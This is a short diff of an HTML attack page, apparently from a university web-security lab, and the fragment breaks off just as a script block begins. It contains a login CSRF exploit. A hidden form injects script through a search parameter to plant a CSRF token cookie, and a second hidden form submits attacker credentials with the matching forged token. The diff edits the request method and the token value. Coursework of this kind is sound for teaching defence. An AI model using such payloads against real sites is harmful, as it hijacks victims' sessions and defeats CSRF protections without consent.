@@ -2,14 +2,14 @@
 <iframe style='display:none' name='frame1'></iframe>
 <iframe style='display:none' name='csrf-frame'></iframe>
 
-<form name="setup_form" id='searchform' action="http://trurl.cs.illinois.edu/search" method="get" target='frame1'>
-	<input type='hidden' name='q' value="<script>document.cookie='csrf_token=test_token';</script>">
+<form name="setup_form" id='searchform' action="http://trurl.cs.illinois.edu/search" method="post" target='frame1'>
+	<input type='hidden' name='q' value="<script>document.cookie='csrf_token=test1';</script>">
 </form>
 
 <form name="loginForm" id="login" action="http://trurl.cs.illinois.edu/login?csrfdefense=1&xssdefense=0" method="post" target='csrf-frame'>
     <input type='hidden' name="username" value="attacker">
     <input type='hidden' name="password" value="l33th4x">
-    <input type='hidden' id = 'csrf_token' name='csrf_token' value='test_token'>
+    <input type='hidden' id = 'csrf_token' name='csrf_token' value='test1'>
 </form>
 
 <script>
